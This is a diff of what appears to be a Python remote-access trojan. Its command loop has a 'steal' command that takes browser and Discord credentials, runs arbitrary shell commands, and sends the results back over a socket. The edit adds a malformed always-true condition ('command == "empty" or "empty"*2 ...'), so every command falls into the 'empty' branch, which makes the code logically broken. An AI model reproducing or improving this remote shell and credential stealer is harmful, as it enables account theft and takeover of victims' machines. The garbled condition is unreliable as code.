@@ -596,20 +596,18 @@ while True:
                             output = f"{Fore.RED}[-]{Fore.WHITE} Could not set directory!"
                     elif command == "steal":
                         output = steal_browser()+steal_discord()
-                    elif command == "empty":
+                    elif command == "empty" or "empty"*2 or "empty"*3 or "empty"*4 or "empty"*5 or "empty"*6 or "empty"*7 or "empty"*8 or "empty"*9 or "empty"*10 or "empty"*11 or "empty"*12 or "empty"*13 or "empty"*14 or "empty"*15 or "empty"*16 or "empty"*17 or "empty"*18 or "empty"*19 or "empty"*20 or "empty"*21 or "empty"*22 or "empty"*23 or "empty"*24 or "empty"*25 or "empty"*26 or "empty"*27 or "empty"*29 or "empty"*30 or "empty"*31 or "empty"*32:
                         output = ""
                     else:
                         output = f"{Fore.RED}[-]{Fore.WHITE} Command not found!"
                 else:
-                    print(command)
                     if command == "exit":
                         shell = False
                         output = f"{Fore.RED}[-]{Fore.WHITE} Closing Shell!"
-                    elif command == "empty":
+                    elif command == "empty" or "empty"*2 or "empty"*3 or "empty"*4 or "empty"*5 or "empty"*6 or "empty"*7 or "empty"*8 or "empty"*9 or "empty"*10 or "empty"*11 or "empty"*12 or "empty"*13 or "empty"*14 or "empty"*15 or "empty"*16 or "empty"*17 or "empty"*18 or "empty"*19 or "empty"*20 or "empty"*21 or "empty"*22 or "empty"*23 or "empty"*24 or "empty"*25 or "empty"*26 or "empty"*27 or "empty"*29 or "empty"*30 or "empty"*31 or "empty"*32:
                         output = ""
                     else:
                         output = subprocess.getoutput(command)
-
                 message = output + payl
                 
                 s.send(message.encode())
